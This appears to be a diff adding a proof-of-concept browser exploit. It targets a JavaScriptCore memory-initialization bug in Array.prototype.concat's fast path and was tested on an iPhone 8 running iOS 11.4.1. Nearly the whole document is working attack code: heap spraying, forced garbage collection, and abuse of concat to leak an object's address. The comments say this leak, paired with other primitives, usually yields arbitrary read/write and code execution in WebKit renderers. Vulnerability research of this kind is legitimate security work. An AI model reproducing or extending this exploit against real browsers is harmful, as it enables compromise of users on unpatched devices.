@@ -1,0 +1,168 @@
+<script>
+/*
+For the detail on JavaScriptCore and terminology used 
+refer to [0].
+
+This is an exploit for a bug in JavaScriptCore function 
+JSC::arrayProtoPrivateFuncConcatMemcpy, fixed via commit [1].
+
+It's similar to the one described in JSC::JSArray::appendMemcpy
+by lokihardt (see [4]). 
+
+Both are optimizations (fast path) for Array.prototype.concat function.
+
+The underlying problem is that JavaScriptCore arrays with UndecidedShape
+might get butterflies which are not initialized. (For instance via
+JSArray::tryCreateUninitializedRestricted method). The header is setup,
+but the rest is left out as it is. The fast path functions mentioned above
+both use memcpy to produce the final result. In the case the function fails
+to properly determine the presence of an UndecidedShape array butterfly as memcpy 
+argument it's going to place the values from uninitialized memory into 
+the newly allocated butterfly and return it back to the caller.
+
+This condition allows to produce materialize primitive (ability to
+make javascript engine threat data at a given address as a javascript object)
+as shown in project zero report. Besides, it allows to obtain a leak primitive
+(ability to leak an arbitrary object address) as shown in this exploit. Having 
+those two primitive is usually enough to get an arbitrary read/write and
+execute within WebKit based renderer process. For instance see [3].
+
+The initial attempt to fix the issue was made in [2], roughly a month after 
+the lokihardt's report. It was not complete and only eliminated the 
+ability to get materialize primitive. We can speculate that it might have been
+related to the fact that project zero report only outlined the materialize 
+primitive and left out the leak one, so the developer only added a check 
+for ContiniousShape, but not for the DoubleShape case.
+
+This particular exploit was tested on iPhone 8, running 11.4.1.
+
+[0] http://www.phrack.org/papers/attacking_javascript_engines.html 
+[1] https://github.com/WebKit/webkit/commit/b68b373dcbfbc68682ceeca8292c5c0051472071.
+[2] https://github.com/WebKit/webkit/commit/7c5c4496c93dce138fa915f47bf12790ad2b7f22
+[3] https://github.com/externalist/exploit_playground/blob/master/CVE-2018-4233/pwn_i8.js
+[4] https://bugs.chromium.org/p/project-zero/issues/detail?id=1236
+
+*/
+
+function print(msg) {
+	alert(msg);
+}
+
+// Triggers full garbage collection
+function _gc() {
+	for (var i=0; i<0x100; i++) {
+		new Uint32Array(0x400*0x400);
+	}
+}
+
+function d2i(d) {
+
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+
+	f64[0] = d;
+
+	return u32[0] + 0x100000000 * u32[1];
+}
+
+function bd2i(d) {
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+	
+	return u32[0] + 0x100000000 * u32[1] - 0x1000000000000;
+}
+
+function i2d(i) {
+	
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+
+	u32[0] = i % 0x100000000;
+	u32[1] = i/0x100000000;
+
+	return f64[0];
+}
+
+function hex(x) {
+	if (x < 0)
+		return `-${hex(-x)}`
+	return `0x${x.toString(16)}`
+}
+
+const __len = 0x40;
+
+// an object to leak
+var x = {};
+
+// trigger the garbage collection so all unmarked 
+// memory blocks become free and do not interfere
+// with our further memory arrangements
+_gc();
+
+const MAGIC=0xB00B5;
+
+// Spam blocks containing pointer to an object we want to 
+// leak. For convenience, we allocate it the same way as the arrays used to trigger
+// the bug, so the blocks are in the same freelist. 
+// Choose __len so the freelist for that size is not heavily used,
+// to increase the success rate.
+for (var i=0; i<0x1000; i++) {
+	var b = new Array(__len).concat(new Array(__len));
+	b[0] = x;
+	// Set second element to 0x0001000000000000 + MAGIC.
+	// First convert it to double represented by MAGIC.
+	// When stored, it's going to get boxed, so we get exactly 
+	// 0x0001000000000000 + MAGIC
+	// We are going to use 0x0001000000000000 + MAGIC 
+	// to detect a spammed block later on.
+	b[1] = i2d(MAGIC);
+}
+
+// trigger garbage collection, so our spammed blocks
+// become free
+_gc();
+
+var a;
+for (var i=0; i<0x100; i++) {
+
+	// Use Array.prototype.concat to allocate 
+	// an Undecided array with uninitialized butterfly 
+	// using JSArray::tryCreateUninitializedRestricted via 
+	// arrayProtoPrivateFuncConcatMemcpy. For details refer to concat 
+	// implementation in JavaScriptCore/builtins/ArrayPrototype.js.
+	a = new Array(__len).concat(new Array(__len));
+
+	// Call arrayProtoPrivateFuncConcatMemcpy with 
+	// Undecided and DoubleArray arrays,
+	// so the result is a DoubleArray containing our spammed 
+	// values as unboxed doubles coupled with unboxed 1.1
+
+	// Here is the buggy code we are attacking 
+	//  ...
+	//  if (type == ArrayWithDouble) {
+        //       double* buffer = result->butterfly()->contiguousDouble().data();
+        //	 memcpy(buffer, firstButterfly->contiguousDouble().data(), sizeof(JSValue) * firstArraySize);
+        //	 memcpy(buffer + firstArraySize, secondButterfly->contiguousDouble().data(), sizeof(JSValue) * secondArraySize);
+    	//  } else if (type != ArrayWithUndecided) {
+	//  ...
+	//  buffer is the resulting array butterfly.
+	//  firstButterfly is pointing to our uninitialized butterfly from Undecided array
+	//  secondButterfly points to butterfly of [1.1] array
+	a = a.concat([1.1]);
+
+	// check the magic value
+	if (d2i(a[1]) == 0x1000000000000 + MAGIC) {
+		break;
+	}
+}
+
+if (a[0] != void 0)
+	print(x.toString() + " address: " + hex(d2i(a[0])));
+else
+	print("failed");
+
+</script>
+
